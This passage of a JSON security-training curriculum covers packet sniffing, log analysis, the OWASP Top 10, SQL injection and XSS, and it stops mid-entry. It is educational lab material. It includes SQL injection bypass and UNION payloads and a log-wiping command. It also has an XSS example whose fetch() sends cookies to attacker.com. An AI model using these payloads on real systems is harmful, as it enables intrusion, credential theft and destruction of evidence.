    "lessons": [
      {
        "title": "1. Essential Wireshark Display Filters",
        "content": "A raw capture can contain millions of packets. Filters let you find needles in the haystack:\n• `ip.addr == 10.10.10.25`: Shows only packets where the source OR destination is 10.10.10.25.\n• `tcp.port == 80`: Shows web traffic.\n• `http.request.method == \"POST\"`: Shows login submissions and form posts!\n• `dns`: Filters only domain name queries and answers.\n• `frame contains \"password\"`: Searches the entire payload of all packets for the keyword 'password'."
      },
      {
        "title": "2. Following the TCP Stream",
        "content": "Instead of reading hundreds of individual 1,500-byte packets, right-click any packet and select **Follow -> TCP Stream**.\nWireshark reassembles all sequence numbers, strips headers, and displays the exact dialogue:\n• **Red text**: Data sent by the client.\n• **Blue text**: Data returned by the server."
      }
    ],
    "seeExamples": [
      {
        "title": "Wireshark Packet Stream Reconstruction",
        "codeOrDiagram": "[ Client Stream - RED ]\nPOST /login.php HTTP/1.1\nHost: internal-portal.corp\nContent-Type: application/x-www-form-urlencoded\n\nusername=administrator&password=SuperSecretPassword2026!\n\n[ Server Stream - BLUE ]\nHTTP/1.1 302 Found\nLocation: /admin/dashboard.php\nSet-Cookie: PHPSESSID=991a0c8b21ef",
        "explanation": "Because HTTP was unencrypted, Wireshark reconstructed the administrator's password in plain clear text."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate packet capture analysis using `tcpdump` to capture 3 HTTP packets with ASCII payload on loopback interface: `tcpdump -i lo -c 3 -A port 8080`:",
      "initialCommand": "",
      "expectedCommand": "tcpdump -i lo -c 3 -A port 8080",
      "simulatedOutput": "tcpdump: verbose output suppressed, listening on lo\n16:36:01.102 IP 127.0.0.1.54320 > 127.0.0.1.8080: Flags [P.], seq 1:92, ack 1\nE..h..@.@.....\nPOST /api/auth HTTP/1.1..Host: localhost..user=cadet&token=lab_pcap_key_88\n[+] Success! 3 packets captured and ASCII payload rendered.",
      "explanation": "`tcpdump -A` is the command-line equivalent of Wireshark, printing payload bytes as readable ASCII text."
    },
    "questions": [
      {
        "id": "r21-q1",
        "type": "multiple-choice",
        "question": "Which Wireshark display filter will show only HTTP requests where the client submitted data using the POST method?",
        "options": [
          "http.request.method == \"POST\"",
          "post.traffic == true",
          "tcp.method == POST",
          "ip.proto == http_post"
        ],
        "correctIndex": 0,
        "explanation": "`http.request.method == \"POST\"` filters the capture down to HTTP POST requests."
      },
      {
        "id": "r21-q2",
        "type": "multiple-choice",
        "question": "When inspecting an HTTPS capture in Wireshark without possessing the server's private cryptographic key, what will the packet payload show?",
        "options": [
          "Plaintext HTML documents",
          "Unencrypted passwords",
          "Opaque, encrypted ciphertext application data that cannot be read",
          "Cleartext SQL queries"
        ],
        "correctIndex": 2,
        "explanation": "Because HTTPS uses TLS encryption, third-party packet sniffers only see encrypted application data."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Capture Loopback HTTP Packet Stream",
        "instruction": "Execute `tcpdump -i lo -c 3 -A port 8080` to inspect live packets passing over the local loopback interface.",
        "hints": [
          "Concept: Command-line packet sniffer.",
          "Direction: Use flags `-i` (interface), `-c` (count), `-A` (ASCII).",
          "Tool: `tcpdump`",
          "Syntax: `tcpdump -i lo -c 3 -A port 8080`",
          "Explanation: Dumps 3 packets in ASCII."
        ]
      }
    ],
    "explainResult": "The `tcpdump` engine configured the AF_PACKET raw socket interface in the kernel to tap incoming frames before delivery to the TCP stack.",
    "securityConnection": "Packet analysis is used in malware reverse engineering, network threat hunting, and data exfiltration detection. Attackers often transmit sensitive stolen files over DNS tunnels or ICMP packets; network defenders detect these covert channels using Wireshark.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Packet Inspection Lab",
      "url": "labs.html?lab=packets"
    },
    "completion": {
      "learned": [
        "How packet sniffers capture network frames using promiscuous mode",
        "Wireshark interface layout and PCAP file structures",
        "Writing effective display filters (ip.addr, tcp.port, http.request.method)",
        "Following TCP streams to extract plaintext credentials"
      ],
      "practiced": [
        "tcpdump -i lo -c 3 -A port 8080",
        "Inspecting raw packet payloads",
        "Analyzing packet stream transcripts"
      ]
    },
    "nextRoomId": "room-22"
  },
  {
    "id": "room-22",
    "stage": 5,
    "stageTitle": "Stage 5 — Security Tools",
    "title": "Logs & Security Event Analysis",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 19 (Linux Toolkit)",
    "whyAreYouHere": "Every single time an attacker enters a system, types a bad password, downloads a file, or crashes a service, the computer leaves a digital footprint: a **Log Entry**. Cybersecurity analysts in Security Operations Centers (SOCs) spend their careers investigating these logs to catch attackers before data is stolen. In this room, you will learn the format of system and web logs, how to spot brute-force attacks, and how to correlate events across multiple systems.",
    "objectives": [
      "Understand the purpose of system logging and the Syslog standard",
      "Learn the location and structure of Linux logs (`/var/log/auth.log`, `syslog`, `nginx/access.log`)",
      "Dissect web server Combined Access Log formats (IP, Timestamp, Method, URI, Status, User-Agent)",
      "Detect brute-force password attacks and web scanning activity from log artifacts",
      "Correlate events using timestamps and source IP addresses"
    ],
    "vocabulary": [
      {
        "term": "Log File",
        "definition": "A chronological record of events, operations, and transactions generated by operating systems, services, and applications."
      },
      {
        "term": "Syslog",
        "definition": "A standardized protocol and architecture for logging system messages on Unix and Linux systems."
      },
      {
        "term": "auth.log / secure",
        "definition": "The system log file recording all authentication events, user logins, sudo executions, and SSH connection attempts."
      },
      {
        "term": "SIEM",
        "definition": "Security Information and Event Management: enterprise software that aggregates, correlates, and analyzes logs from hundreds of servers."
      },
      {
        "term": "Log Correlation",
        "definition": "The analytical process of linking related events across multiple systems to reconstruct an adversary's complete attack timeline."
      }
    ],
    "lessons": [
      {
        "title": "1. The Web Server Access Log Format",
        "content": "Web servers like Apache and Nginx record every single incoming request:\n```text\n192.168.1.105 - - [05/Oct/2026:16:30:45 +0000] \"GET /admin.php HTTP/1.1\" 404 196 \"-\" \"Nikto/2.1.6\"\n```\n• **IP**: `192.168.1.105` (Who sent the request).\n• **Timestamp**: `05/Oct/2026:16:30:45`.\n• **Request**: `GET /admin.php HTTP/1.1`.\n• **Status Code**: `404` (Not Found).\n• **User-Agent**: `Nikto/2.1.6` (Dead giveaway: this is an automated vulnerability scanner!)."
      },
      {
        "title": "2. Spotting an SSH Brute-Force Attack",
        "content": "When someone launches a dictionary attack against SSH, `/var/log/auth.log` fills with repeated failures:\n```text\nOct 5 16:32:01 server sshd[1420]: Failed password for root from 203.0.113.88 port 48122 ssh2\nOct 5 16:32:02 server sshd[1422]: Failed password for admin from 203.0.113.88 port 48124 ssh2\nOct 5 16:32:03 server sshd[1424]: Failed password for user from 203.0.113.88 port 48126 ssh2\nOct 5 16:32:05 server sshd[1426]: Accepted password for support from 203.0.113.88 port 48128 ssh2\n```\nNotice: 3 rapid failed attempts followed by an accepted password on line 4! The attacker guessed the password for `support`."
      }
    ],
    "seeExamples": [
      {
        "title": "Analyzing Web Scanner Logs with awk and sort",
        "codeOrDiagram": "cadet@endlessus:~$ awk '{print $1}' access.log | sort | uniq -c | sort -nr\n   1420 192.168.1.105   <-- Sent 1,420 requests in 30 seconds!\n     12 10.0.0.4\n      4 10.0.0.8",
        "explanation": "Piping awk, sort, and uniq counts requests per IP, immediately exposing aggressive vulnerability scanners and denial-of-service bots."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Find the top IP addresses sending requests in our lab web log using `awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr`:",
      "initialCommand": "",
      "expectedCommand": "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr",
      "simulatedOutput": "   1842 192.168.1.99\n     24 10.10.10.5\n      3 127.0.0.1\n[+] Success! Attacker IP 192.168.1.99 identified with 1,842 requests.",
      "explanation": "A single IP sending thousands of requests in seconds indicates automated directory fuzzing or vulnerability scanning."
    },
    "questions": [
      {
        "id": "r22-q1",
        "type": "multiple-choice",
        "question": "In standard Linux systems, which log file records SSH connection attempts, failed logins, and sudo command invocations?",
        "options": [
          "/var/log/auth.log (or /var/log/secure)",
          "/var/log/dpkg.log",
          "/etc/resolv.conf",
          "/tmp/session.log"
        ],
        "correctIndex": 0,
        "explanation": "`/var/log/auth.log` (on Debian/Ubuntu) and `/var/log/secure` (on RHEL/CentOS) log authentication activity."
      },
      {
        "id": "r22-q2",
        "type": "multiple-choice",
        "question": "When auditing web server logs, why is the `User-Agent` string valuable for detecting automated attacks?",
        "options": [
          "It encrypts the database server",
          "Automated vulnerability scanners (like sqlmap, Nikto, or Gobuster) often advertise their tool name in the default User-Agent header",
          "It provides the user's home Wi-Fi password",
          "It changes the client's MAC address"
        ],
        "correctIndex": 1,
        "explanation": "Unless customized, tools like sqlmap or Nikto identify themselves directly in the User-Agent header, making detection straightforward."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Isolate High-Frequency Request IP",
        "instruction": "Run `awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr` to isolate the attacker's IP.",
        "hints": [
          "Concept: Log aggregation and frequency counting.",
          "Direction: Pipe awk to sort and uniq.",
          "Tool: `awk`, `sort`, `uniq`",
          "Syntax: Run the complete command string.",
          "Explanation: Reveals anomalous volume."
        ]
      }
    ],
    "explainResult": "The pipeline parsed field 1 (client IP), sorted the list, grouped identical values with frequency counts, and sorted in reverse numerical order.",
    "securityConnection": "Log analysis bridges offensive and defensive cybersecurity. Attackers attempt to clear logs (`shred -u /var/log/auth.log`) to hide their tracks. In response, modern enterprises forward logs in real-time to write-once, append-only SIEM systems so evidence cannot be deleted!",
    "completion": {
      "learned": [
        "The purpose of system and application logging",
        "The location and formatting of `/var/log/auth.log` and web access logs",
        "How to detect brute-force attacks and scanner fingerprints",
        "Using shell utilities (`awk`, `sort`, `uniq`) for incident triage"
      ],
      "practiced": [
        "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c",
        "Carving attacker IP addresses",
        "Correlating security events"
      ]
    },
    "nextRoomId": "room-23"
  },
  {
    "id": "room-23",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "Web Security Fundamentals & OWASP Top 10",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Stage 3 (How the Web Works) & Stage 4 (Cybersecurity Fundamentals)",
    "whyAreYouHere": "You now understand HTTP, headers, cookies, and network protocols. Now you are ready to study how web applications break. Web applications are the primary target for attackers because they sit open to the entire world on ports 80 and 443. In this room, you will learn the fundamental principle of web security: **Never Trust User Input**, and explore the global benchmark: the OWASP Top 10.",
    "objectives": [
      "Understand the Three-Tier Web Application Architecture (Presentation, Application, Database)",
      "Master the Core Security Axiom: Never Trust Client-Side Input",
      "Understand Input Validation vs Output Encoding",
      "Explore the OWASP Top 10 framework and its top categories",
      "Audit an insecure input form parameter in the lab"
    ],
    "vocabulary": [
      {
        "term": "OWASP",
        "definition": "Open Web Application Security Project: a global nonprofit dedicated to improving the security of software through open standards and educational resources."
      },
      {
        "term": "OWASP Top 10",
        "definition": "A regularly updated consensus report ranking the ten most critical security risks facing web applications worldwide."
      },
      {
        "term": "Input Validation",
        "definition": "The security practice of verifying that all incoming client data matches expected formats, lengths, and character sets before processing."
      },
      {
        "term": "Output Encoding",
        "definition": "Transforming untrusted user input before rendering it into HTML/JS so the browser interprets it as data, not executable code."
      },
      {
        "term": "Attack Vector",
        "definition": "A path or means by which an attacker can gain access to a computer or network server to deliver a malicious outcome."
      }
    ],
    "lessons": [
      {
        "title": "1. The Cardinal Rule: Never Trust the Client",
        "content": "Many novice developers validate form inputs using HTML or JavaScript in the user's browser:\n```html\n<input type=\"number\" min=\"1\" max=\"100\" name=\"quantity\">\n```\nAn attacker does not use a browser! They use **curl** or **Burp Suite** to bypass the browser entirely, sending:\n```http\nPOST /order HTTP/1.1\nquantity=-99999\n```\nBecause client-side validation is completely under the attacker's control, **all validation must occur on the server**!"
      },
      {
        "title": "2. The OWASP Top 10 Landscape",
        "content": "The OWASP Top 10 provides the vocabulary for modern application security:\n1. **Broken Access Control**: Users accessing other users' records or admin portals.\n2. **Cryptographic Failures**: Weak algorithms, plaintext sensitive data.\n3. **Injection**: SQL injection, command injection, LDAP injection.\n4. **Insecure Design**: Fundamental architectural flaws.\n5. **Security Misconfiguration**: Default passwords, open cloud buckets, debugging enabled.\n6. **Vulnerable and Outdated Components**: Using old libraries with known CVEs.\n7. **Identification and Authentication Failures**: Brute-force, missing MFA, session flaws.\n8. **Software and Data Integrity Failures**: Insecure CI/CD pipelines and untrusted updates.\n9. **Security Logging and Monitoring Failures**: Inability to detect active breaches.\n10. **Server-Side Request Forgery (SSRF)**: Tricking a server into accessing internal resources."
      }
    ],
    "seeExamples": [
      {
        "title": "Client-Side vs Server-Side Validation Flow",
        "codeOrDiagram": "[ Attacker with Burp Suite / curl ]\n                ↓ Bypasses browser JavaScript restrictions completely!\n[ Malicious Payload: quantity=-50&price=0.01 ]\n                ↓\n[ Web Server Backend: MUST validate input on server! ]\n   ├── IF invalid: Reject with HTTP 400 Bad Request\n   └── IF valid: Sanitize, parameterize, and execute safely",
        "explanation": "Never rely on browser HTML5 or JavaScript validation for security. Always enforce validation on the backend server."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate bypassing a client-side quantity limit by sending an arbitrary HTTP POST payload directly to the server with curl: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`:",
      "initialCommand": "",
      "expectedCommand": "curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add",
      "simulatedOutput": "HTTP/1.1 200 OK\n{\"cart\":[{\"item\":\"sword\",\"qty\":-100,\"total\":-5000}],\"warning\":\"Server failed to validate negative integer!\"}\n[+] Success! Negative quantity accepted because the server relied on client-side HTML checks.",
      "explanation": "Directly transmitting crafted HTTP parameters demonstrates why backend validation is strictly required."
    },
    "questions": [
      {
        "id": "r23-q1",
        "type": "multiple-choice",
        "question": "Why is HTML5 or JavaScript input validation running inside the user's browser completely insufficient for preventing web attacks?",
        "options": [
          "Because HTML5 is only supported on mobile devices",
          "Because attackers can bypass the browser entirely by sending raw HTTP requests using tools like curl, Python, or Burp Suite",
          "Because JavaScript cannot process alphanumeric characters",
          "Because servers automatically disable client scripts"
        ],
        "correctIndex": 1,
        "explanation": "The client environment is entirely controlled by the user. An attacker can craft any raw HTTP request they desire, bypassing all browser validation."
      },
      {
        "id": "r23-q2",
        "type": "multiple-choice",
        "question": "Which OWASP Top 10 category covers flaws where an attacker tampers with a URL parameter like `?user_id=105` to view another customer's private account?",
        "options": [
          "Broken Access Control",
          "Cryptographic Failures",
          "Security Misconfiguration",
          "Software Integrity Failure"
        ],
        "correctIndex": 0,
        "explanation": "Failing to verify whether the logged-in user has permission to access the requested object is a Broken Access Control flaw (specifically IDOR)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Test Server-Side Input Boundaries",
        "instruction": "Send `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add` to test backend validation.",
        "hints": [
          "Concept: Parameter tampering via curl.",
          "Direction: Submit negative quantity value.",
          "Tool: `curl`",
          "Syntax: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`",
          "Explanation: Tests if backend validates integers."
        ]
      }
    ],
    "explainResult": "The `curl` command transmitted an unconstrained POST parameter directly to the web service, exposing the absence of server-side data sanitization.",
    "securityConnection": "Auditing input fields is the starting point for discovering SQL injection, Cross-Site Scripting, Command Injection, and Path Traversal. In the following rooms, you will examine each of these flaws in practical detail.",
    "completion": {
      "learned": [
        "The three-tier web application architecture",
        "The golden rule: Never trust client-side user input",
        "Input validation vs context-aware output encoding",
        "The structure and significance of the OWASP Top 10"
      ],
      "practiced": [
        "curl -d \"item=sword&qty=-100\"",
        "Bypassing client-side controls",
        "Mapping vulnerabilities to OWASP categories"
      ]
    },
    "nextRoomId": "room-24"
  },
  {
    "id": "room-24",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "SQL & Databases for Security Analysts",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "25 min",
    "prerequisites": "Room 23 (Web Security Fundamentals)",
    "whyAreYouHere": "Before you can exploit or defend against SQL Injection (SQLi), you must understand the language that databases speak: **SQL (Structured Query Language)**. Databases store the modern world's most valuable treasures — passwords, personal identities, credit card tokens, and business transactions. In this room, you will learn how databases structure data into tables, rows, and columns, and how queries are constructed using `SELECT`, `WHERE`, `AND`, `OR`, and `UNION`.",
    "objectives": [
      "Understand Relational Databases (RDBMS): Tables, Columns, Rows, and Primary Keys",
      "Master core SQL query syntax: `SELECT ... FROM ... WHERE ...`",
      "Understand boolean logic in SQL: `AND`, `OR`, and tautologies (`1=1`)",
      "Learn how `UNION` combines results from multiple database tables",
      "Execute SQL queries inside the interactive database shell"
    ],
    "vocabulary": [
      {
        "term": "RDBMS",
        "definition": "Relational Database Management System: software (like PostgreSQL, MySQL, SQLite) that stores data in structured tables linked by relationships."
      },
      {
        "term": "SQL (Structured Query Language)",
        "definition": "The standard domain-specific language used for querying, manipulating, and managing relational databases."
      },
      {
        "term": "SELECT",
        "definition": "The SQL statement used to retrieve data records from one or more tables."
      },
      {
        "term": "WHERE Clause",
        "definition": "A SQL clause used to filter query results to only rows that satisfy a specified boolean condition."
      },
      {
        "term": "Tautology",
        "definition": "A mathematical statement that is always true under all conditions (e.g. `'1'='1'` or `TRUE`)."
      },
      {
        "term": "UNION Operator",
        "definition": "A SQL operator used to combine the result sets of two or more SELECT statements into a single unified result."
      }
    ],
    "lessons": [
      {
        "title": "1. The Architecture of a Database Table",
        "content": "Inside a database, information is structured like an Excel spreadsheet:\n**Table: `users`**\n```text\nid | username | email              | role\n 1 | admin    | admin@corp.local   | administrator\n 2 | alice    | alice@gmail.com    | customer\n 3 | bob      | bob@outlook.com    | customer\n```\nTo fetch only the admin user:\n```sql\nSELECT username, email FROM users WHERE role = 'administrator';\n```"
      },
      {
        "title": "2. The Danger of Boolean OR",
        "content": "In SQL, the `AND` operator requires *both* conditions to be true:\n`WHERE username = 'alice' AND password = 'password123'`\n\nThe `OR` operator only requires *one* condition to be true!\nIf an expression evaluates to:\n`WHERE username = 'admin' OR 1=1`\nBecause `1=1` is always mathematically true, the database returns records regardless of what was on the other side! This simple logic is the heart of authentication bypass."
      }
    ],
    "seeExamples": [
      {
        "title": "The UNION Query Requirement",
        "codeOrDiagram": "SELECT id, name, price FROM products WHERE category = 'books'\nUNION\nSELECT id, username, password FROM users;",
        "explanation": "The `UNION` operator allows attackers to extract data from completely different tables, provided both queries return the same number of columns with compatible data types."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Query the lab SQLite database to select all usernames and roles from the `users` table: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`:",
      "initialCommand": "",
      "expectedCommand": "sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"",
      "simulatedOutput": "1|admin|administrator\n2|developer|staff\n3|cadet|student\n[+] Success! Queried 3 records from SQLite database.",
      "explanation": "Standard SQL queries extract specific columns from designated tables using the `SELECT` statement."
    },
    "questions": [
      {
        "id": "r24-q1",
        "type": "multiple-choice",
        "question": "In the SQL query `SELECT * FROM accounts WHERE id = 5 OR 1=1;`, what will the database return?",
        "options": [
          "Only account ID 5",
          "An error, because 1=1 is invalid syntax",
          "All records from the accounts table, because the condition `1=1` is always true for every row",
          "Nothing, because the query has no password"
        ],
        "correctIndex": 2,
        "explanation": "Because `OR 1=1` is a tautology (always true), the WHERE condition evaluates to TRUE for every single row in the table, returning all records."
      },
      {
        "id": "r24-q2",
        "type": "multiple-choice",
        "question": "What technical condition must be satisfied to successfully use the SQL `UNION` operator between two `SELECT` queries?",
        "options": [
          "Both queries must select from the same table",
          "Both SELECT statements must return the exact same number of columns with compatible data types",
          "Both queries must be written in uppercase",
          "The database must be running Microsoft Access"
        ],
        "correctIndex": 1,
        "explanation": "A SQL `UNION` requires both queries to have identical column counts and matching or compatible data types in each position."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute SQL Query",
        "instruction": "Run `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"` to inspect table records.",
        "hints": [
          "Concept: Query SQLite table.",
          "Direction: Use the sqlite3 CLI with SQL statement.",
          "Tool: `sqlite3`",
          "Syntax: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`",
          "Explanation: Returns table rows."
        ]
      }
    ],
    "explainResult": "The SQLite engine compiled the query bytecode, executed an index scan over the `users` B-Tree table, and formatted matching column tuples.",
    "securityConnection": "SQL fluency is essential for discovering and exploiting SQL injection. When an application concatenates untrusted user input directly into a SQL query string, attackers can inject SQL syntax to hijack the query logic.",
    "completion": {
      "learned": [
        "Relational database structure (Tables, Columns, Rows, Primary Keys)",
        "Writing SELECT queries with WHERE filtering",
        "How boolean AND and OR logic operates inside databases",
        "The requirements and mechanism of the UNION operator"
      ],
      "practiced": [
        "sqlite3 db.sqlite \"SELECT ...\"",
        "Querying database records",
        "Analyzing SQL boolean expressions"
      ]
    },
    "nextRoomId": "room-25"
  },
  {
    "id": "room-25",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "SQL Injection: Detection & Exploitation",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "40 min",
    "prerequisites": "Room 24 (SQL & Databases)",
    "whyAreYouHere": "SQL Injection (SQLi) is one of the most devastating vulnerabilities in computer history. It occurs when an application takes user input (such as a username or search term) and glues it directly into a database query string without sanitization. An attacker can break out of the data context, inject their own SQL commands, bypass authentication, and dump the entire database. In this room, you will learn how SQLi works and how parameterized queries prevent it.",
    "objectives": [
      "Understand the root cause of SQL Injection: mixing code and data",
      "Master the classic Authentication Bypass payload: `' OR '1'='1`",
      "Learn UNION-based data extraction to dump sensitive tables",
      "Understand Blind SQL Injection (Boolean-based and Time-based)",
      "Learn how Parameterized Queries (Prepared Statements) completely eradicate SQLi"
    ],
    "vocabulary": [
      {
        "term": "SQL Injection (SQLi)",
        "definition": "A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database."
      },
      {
        "term": "Authentication Bypass",
        "definition": "Exploiting SQL injection in a login form to authenticate as an administrator without providing a valid password."
      },
      {
        "term": "UNION-Based SQLi",
        "definition": "Using the SQL UNION operator to append the results of an attacker-crafted query to the original query's response."
      },
      {
        "term": "Blind SQLi",
        "definition": "A form of SQLi where the database does not return data or errors on the screen, requiring the attacker to infer data using true/false conditions or time delays."
      },
      {
        "term": "Parameterized Query (Prepared Statement)",
        "definition": "A database defense pattern where SQL code is pre-compiled and user input is treated strictly as literal data, never as executable code."
      }
    ],
    "lessons": [
      {
        "title": "1. The Vulnerable Code: Mixing Code with Data",
        "content": "Consider this vulnerable backend PHP/Python code:\n```python\n# DANGEROUS STRING CONCATENATION!\nquery = \"SELECT * FROM users WHERE user = '\" + input_user + \"' AND pass = '\" + input_pass + \"'\"\n```\nIf a regular user enters `cadet`, the query is:\n`SELECT * FROM users WHERE user = 'cadet' AND pass = '123'`\n\nNow look what happens if an attacker enters this as their username:\n`admin' OR '1'='1`\nThe resulting SQL becomes:\n`SELECT * FROM users WHERE user = 'admin' OR '1'='1' AND pass = ''`\nBecause `'1'='1'` is true, the database logs the attacker in as **admin** without checking the password at all!"
      },
      {
        "title": "2. The True Remediation: Parameterized Queries",
        "content": "You cannot fix SQL injection with simple regex filters or replacing single quotes. The **only** complete fix is **Prepared Statements**:\n```python\n# SECURE: Code and Data are strictly separated!\ncursor.execute(\"SELECT * FROM users WHERE user = %s AND pass = %s\", (input_user, input_pass))\n```\nThe database engine compiles the SQL command structure *before* looking at the user parameters. Even if the user submits `' OR '1'='1`, the database treats it as literal string characters, not executable code!"
      }
    ],
    "seeExamples": [
      {
        "title": "UNION-Based Extraction Flow",
        "codeOrDiagram": "Original query:\nSELECT name, description, price FROM products WHERE category = 'gear'\n\nInjected payload in category:\ngear' UNION SELECT 1, username || ':' || password, 3 FROM users--\n\nDatabase returns product rows followed by user credentials!",
        "explanation": "The `--` characters in SQL tell the database to ignore the rest of the original query as a comment, preventing syntax errors."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate a vulnerable SQL injection login bypass against our lab API using curl: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`:",
      "initialCommand": "",
      "expectedCommand": "curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login",
      "simulatedOutput": "HTTP/1.1 200 OK\n{\"auth\":true,\"role\":\"administrator\",\"token\":\"flag{sql_injection_bypass_master}\"}\n[+] Success! Authentication bypassed. SQL logic evaluated to TRUE.",
      "explanation": "The injected `' OR '1'='1--` forced the SQL query WHERE clause to evaluate to TRUE, returning the admin account."
    },
    "questions": [
      {
        "id": "r25-q1",
        "type": "multiple-choice",
        "question": "What is the single most effective and industry-recommended defense for completely eliminating SQL injection vulnerabilities in software development?",
        "options": [
          "Deploying a client-side JavaScript regex filter",
          "Using Parameterized Queries (Prepared Statements) with bound variables",
          "Switching the database port from 3306 to 3307",
          "Base64-encoding all passwords before sending them to the database"
        ],
        "correctIndex": 1,
        "explanation": "Parameterized queries separate the query structure from the user data, guaranteeing that user input is never interpreted as executable SQL syntax."
      },
      {
        "id": "r25-q2",
        "type": "multiple-choice",
        "question": "In SQL syntax, what is the purpose of appending `--` (or `#` in MySQL) at the end of a SQL injection payload?",
        "options": [
          "It forces the database to restart",
          "It comments out the remainder of the original developer's SQL query, preventing syntax errors from trailing quotes",
          "It automatically encrypts the response",
          "It downloads the database to the desktop"
        ],
        "correctIndex": 1,
        "explanation": "`--` is a SQL comment symbol. Everything following it is ignored by the parser, neutralizing remaining syntax."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute SQLi Auth Bypass",
        "instruction": "Run `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login` to bypass authentication.",
        "hints": [
          "Concept: Authentication bypass via boolean injection.",
          "Direction: Submit payload in username parameter.",
          "Tool: `curl`",
          "Syntax: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`",
          "Explanation: Bypasses password verification."
        ]
      }
    ],
    "explainResult": "The backend concatenated the payload directly into the SQL string, modifying the syntax tree such that `1=1` satisfied the WHERE clause.",
    "securityConnection": "SQL injection continues to be responsible for the largest data breaches in corporate history. Security testers test every input field, URL parameter, HTTP header, and cookie for SQL injection indicators.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical SQL Injection Room",
      "url": "labs.html?lab=sqli"
    },
    "completion": {
      "learned": [
        "The root architectural cause of SQL injection",
        "Crafting boolean authentication bypass payloads (' OR '1'='1)",
        "The role of SQL comments (--) in neutralizing syntax errors",
        "Why Parameterized Queries (Prepared Statements) are the only complete defense"
      ],
      "practiced": [
        "curl -d \"username=admin' OR '1'='1--&password=x\"",
        "Bypassing authentication gates",
        "Analyzing SQL injection vulnerabilities"
      ]
    },
    "nextRoomId": "room-26"
  },
  {
    "id": "room-26",
    "stage": 6,
    "stageTitle": "Stage 6 — Web Security",
    "title": "Cross-Site Scripting (XSS)",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "40 min",
    "prerequisites": "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
    "whyAreYouHere": "In SQL injection, an attacker targets the backend database server. In **Cross-Site Scripting (XSS)**, the attacker targets the other end: the **victim's web browser**! XSS occurs when a web application takes untrusted input and includes it in a web page without proper escaping or encoding. When another user views that page, their browser executes the attacker's JavaScript code. In this room, you will learn the three types of XSS: Reflected, Stored, and DOM-based, and how to defend against them.",
    "objectives": [
      "Understand how browsers execute JavaScript within the Document Object Model (DOM)",
      "Learn the three varieties of XSS: Reflected XSS, Stored XSS, and DOM-based XSS",
      "Understand the severe impact of XSS: stealing session cookies, logging keystrokes, and defacing websites",
      "Learn how Context-Aware Output Encoding neutralizes malicious HTML tags",
      "Understand Content Security Policy (CSP) as a defense-in-depth barrier"
    ],
    "vocabulary": [
      {
        "term": "XSS (Cross-Site Scripting)",
        "definition": "A client-side code injection vulnerability where malicious JavaScript is injected into trusted websites."
      },
      {
        "term": "Stored XSS (Persistent)",
        "definition": "The most dangerous XSS type, where the malicious script is permanently stored in the database (e.g. in a comment or profile) and executed by every visitor."
      },
      {
        "term": "Reflected XSS (Non-Persistent)",
        "definition": "XSS where the malicious script is delivered in a URL parameter and immediately reflected back in the server's immediate HTTP response."
      },
      {
        "term": "DOM-Based XSS",
        "definition": "XSS that occurs entirely within the client-side JavaScript code without the payload ever reaching the backend web server."
      },
      {
        "term": "Context-Aware Output Encoding",
        "definition": "Converting characters with special meaning in HTML (like `<` to `&lt;` and `>` to `&gt;`) so the browser renders them as harmless text."
      }
    ],
    "lessons": [
      {
        "title": "1. The Three Flavors of XSS",
        "content": "• **Reflected XSS**: Attacker sends a phishing link: `https://bank.com/search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>`. When the victim clicks, the bank's search page reflects the query into HTML, running the script.\n• **Stored XSS**: Attacker posts a comment on a forum: `<script>stealData()</script>`. The script is saved to the database. Every user who loads that forum post executes the script!\n• **DOM XSS**: Client-side JavaScript reads `location.hash` and inserts it into the page using `innerHTML` without server involvement."
      },
      {
        "title": "2. The Defense: Output Encoding & CSP",
        "content": "To fix XSS, browsers must know that user input is text, not executable code:\n• If user enters: `<script>alert(1)</script>`\n• The server must encode it as: `&lt;script&gt;alert(1)&lt;/script&gt;`\nThe browser renders the literal text on the screen, but refuses to execute it as a script tag!\nAdditionally, **Content Security Policy (CSP)** headers restrict where scripts can be loaded from."
      }
    ],
    "seeExamples": [
      {
